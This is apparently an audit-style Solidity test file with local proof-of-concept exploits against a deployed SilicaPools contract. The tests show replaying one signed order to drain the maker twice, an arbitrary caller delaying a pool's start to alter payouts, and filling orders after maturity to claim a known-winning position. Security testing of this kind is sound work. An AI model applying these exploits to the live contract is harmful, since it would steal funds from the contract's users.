// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {SilicaPools} from "../../onchain_auto/0xf3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde/contracts/SilicaPools.sol";
import {ISilicaPools} from "../../onchain_auto/0xf3f84ce038442ae4c4dcb6a8ca8bacd7f28c9bde/interfaces/ISilicaPools.sol";

interface Vm {
    function warp(uint256) external;
    function prank(address) external;
    function sign(uint256, bytes32) external returns (uint8, bytes32, bytes32);
    function addr(uint256) external returns (address);
}

Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockIndex {
    uint256 public immutable decimals = 18;
    uint256 public shares = 1e18;
    uint256 public balance;

    function setBalance(uint256 newBalance) external {
        balance = newBalance;
    }
}

contract SilicaPoolsLocalTest {
    uint256 internal constant MAKER_PK = 0xA11CE;
    address internal immutable maker = vm.addr(MAKER_PK);
    address internal constant taker = address(0xBEEF);
    address internal constant treasury = address(0xCAFE);
    address internal constant owner = address(0xABCD);

    function testReplayableFullFillDrainsMakerTwice() external {
        MockERC20 token = new MockERC20();
        SilicaPools pools = new SilicaPools(0, owner, treasury, 0, 0, 0);

        token.mint(maker, 2e18);
        vm.prank(maker);
        token.approve(address(pools), type(uint256).max);

        ISilicaPools.PoolParams memory zeroPool;
        ISilicaPools.SilicaOrder memory order = ISilicaPools.SilicaOrder({
            maker: maker,
            taker: address(0),
            expiry: type(uint48).max,
            offeredUpfrontToken: address(token),
            offeredUpfrontAmount: 1e18,
            offeredLongSharesParams: zeroPool,
            offeredLongShares: 0,
            requestedUpfrontToken: address(0),
            requestedUpfrontAmount: 0,
            requestedLongSharesParams: zeroPool,
            requestedLongShares: 0
        });

        bytes32 digest = pools.hashOrder(order, pools.domainSeparatorV4());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(MAKER_PK, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.prank(taker);
        pools.fillOrder(order, signature, 1e18);
        vm.prank(taker);
        pools.fillOrder(order, signature, 1e18);

        require(token.balanceOf(taker) == 2e18, "taker did not receive maker funds twice");
    }

    function testAnyoneCanDelayStartToFlipEconomics() external {
        MockERC20 token = new MockERC20();
        MockIndex index = new MockIndex();
        SilicaPools pools = new SilicaPools(0, owner, treasury, 0, 0, 0);

        ISilicaPools.PoolParams memory params = ISilicaPools.PoolParams({
            floor: 0,
            cap: 1000e18,
            index: address(index),
            targetStartTimestamp: 1000,
            targetEndTimestamp: 2000,
            payoutToken: address(token)
        });

        token.mint(address(this), 1000e18);
        token.approve(address(pools), type(uint256).max);
        pools.collateralizedMint(params, bytes32(0), 1e18, address(0x1111), address(0x2222));

        index.setBalance(199e18);
        vm.warp(1990);
        vm.prank(address(0x5555));
        pools.startPool(params);

        index.setBalance(200e18);
        vm.warp(2000);
        vm.prank(address(0x6666));
        pools.endPool(params);

        ISilicaPools.PoolState memory state = pools.poolState(pools.hashPool(params));
        require(state.actualStartTimestamp == 1990, "unexpected delayed start");
        require(state.balanceChangePerShare == 1e18, "late start did not suppress accrued performance");
    }

    function testOrdersRemainFillableAfterTargetEnd() external {
        MockERC20 token = new MockERC20();
        MockIndex index = new MockIndex();
        SilicaPools pools = new SilicaPools(0, owner, treasury, 0, 0, 0);

        ISilicaPools.PoolParams memory params = ISilicaPools.PoolParams({
            floor: 0,
            cap: 100e18,
            index: address(index),
            targetStartTimestamp: 1000,
            targetEndTimestamp: 2000,
            payoutToken: address(token)
        });

        token.mint(maker, 100e18);
        vm.prank(maker);
        token.approve(address(pools), type(uint256).max);

        index.setBalance(100e18);
        vm.warp(1000);
        pools.startPool(params);

        ISilicaPools.SilicaOrder memory order = ISilicaPools.SilicaOrder({
            maker: maker,
            taker: address(0),
            expiry: type(uint48).max,
            offeredUpfrontToken: address(0),
            offeredUpfrontAmount: 0,
            offeredLongSharesParams: params,
            offeredLongShares: 1e18,
            requestedUpfrontToken: address(0),
            requestedUpfrontAmount: 0,
            requestedLongSharesParams: params,
            requestedLongShares: 0
        });

        bytes32 digest = pools.hashOrder(order, pools.domainSeparatorV4());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(MAKER_PK, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        index.setBalance(200e18);
        vm.warp(2001);
        vm.prank(taker);
        pools.fillOrder(order, signature, 1e18);

        vm.prank(address(0x7777));
        pools.endPool(params);

        vm.prank(taker);
        pools.redeemLong(params);

        require(token.balanceOf(taker) == 100e18, "taker could not realize known-winning long after maturity");
    }
}
